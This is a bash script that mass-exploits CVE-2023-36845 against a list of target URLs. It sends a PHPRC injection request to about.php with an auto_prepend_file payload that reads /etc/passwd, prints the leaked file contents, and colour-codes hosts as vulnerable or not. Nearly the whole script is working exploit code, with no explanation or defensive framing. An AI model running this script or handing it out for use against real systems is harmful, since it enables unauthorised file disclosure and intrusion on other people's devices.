#!/bin/bash
# ANSI color codes
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color
fetch_etc_passwd() {
    curl -ks --max-time 5 "$1/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"' | head -n 11
}
if [ -r "/etc/passwd" ]; then
    if [ ! -f "CVE-2023-36845-targets.txt" ]; then
        echo "File CVE-2023-36845-targets.txt not found."
        exit 1
    fi
    mapfile -t urls < "CVE-2023-36845-targets.txt"
    
    for url in "${urls[@]}"; do
        echo -e "${GREEN}Processing URL: $url${NC}"
        
        passwd_content=$(fetch_etc_passwd "$url")
        
        if [ -n "$passwd_content" ]; then
            echo "$passwd_content"
        else
            echo -e "${RED}The host is not vulnerable.${NC}"
        fi
     done
else
    echo "The /etc/passwd file is not readable. Skipping curl command."
    if [ ! -f "CVE-2023-36845-urls.txt" ]; then
        echo "File CVE-2023-36845-urls.txt not found."
        exit 1
    fi
    mapfile -t urls < "CVE-2023-36845-urls.txt"
    
    for url in "${urls[@]}"; do
        echo -e "${YELLOW}URL: $url${NC}"
    done
fi
